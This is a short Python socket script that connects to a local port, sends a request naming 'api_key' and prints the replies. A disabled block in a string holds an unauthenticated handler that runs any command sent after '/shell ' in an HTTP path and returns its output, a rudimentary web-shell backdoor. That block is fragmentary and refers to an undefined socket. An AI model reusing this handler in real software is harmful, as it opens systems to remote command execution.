
connect: str = "127.0.0.1"
port: int = 8888
http_port: int = 11451

import os
import socket
import requests
import urllib


'''
    def server():
        conn = http_socket

        client_message = conn.makefile().readline()
        
        try:
            requests_url: str = client_message[client_message.index(" ")+1:client_message.rfind("H")-1]
            requests_url: str = requests_url.strip()
            requests_url: str = urllib.parse.unquote(requests_url)

            print(requests_url)

            if requests_url.startswith("/shell "):
                shell: str = requests_url[requests_url.index("/shell ")+len("/shell ") : len(requests_url)]
                
                if shell.startswith("cd "):
                    cd_path = shell[3:len(shell)]
                    cd_path = cd_path.strip()
                    os.chdir(cd_path)

                run = os.popen(shell)
                conn.send(bytes(run.read().encode()))
                conn.close()
            
            else:
                conn.send(bytes("command error".encode()))
                conn.close()

        except:
            conn.send(bytes("error".encode()))
            conn.close()
'''


def socket_service():
    #print(" [INFO] START HTTP SEVICE ON PORT: "+str(port))
    http_socket = socket.socket()
    http_socket.connect((connect,port))

    http_socket.send(bytes("GET /?api_key HTTP/1.1".encode()))
    while True:
        try:
            client_message = http_socket.makefile().readline()
            
            if not client_message:
                break
            print(client_message)
        except:
            break


if __name__ == '__main__':
    socket_service()
    